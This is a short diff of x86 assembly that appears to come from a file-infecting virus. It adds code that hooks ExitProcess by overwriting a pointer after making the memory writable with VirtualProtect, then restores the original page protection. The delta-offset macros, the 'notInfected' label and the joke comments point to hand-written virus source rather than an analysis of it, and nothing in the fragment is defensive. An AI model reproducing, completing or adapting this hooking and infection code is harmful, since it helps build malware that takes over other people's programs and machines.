@@ -24,6 +24,7 @@ nop
 nop
 nop
 nop
+; WE SHALL PASS!
 pusha
 PDELTA	OldProtect
 push	PAGE_READWRITE
@@ -33,7 +34,16 @@ call	[DELTA pVirtualProtect]
 popa
 mov	eax, hook_exitprocess
 add	eax, ebp
+; Hook ExitProcess
 mov	dword ptr [ecx], eax
+; Restore Gandalf
+pusha
+PDELTA	OldProtect
+PVDELTA	OldProtect
+push	4
+push	ecx
+call	[DELTA pVirtualProtect]
+popa
 
 
 notInfected:
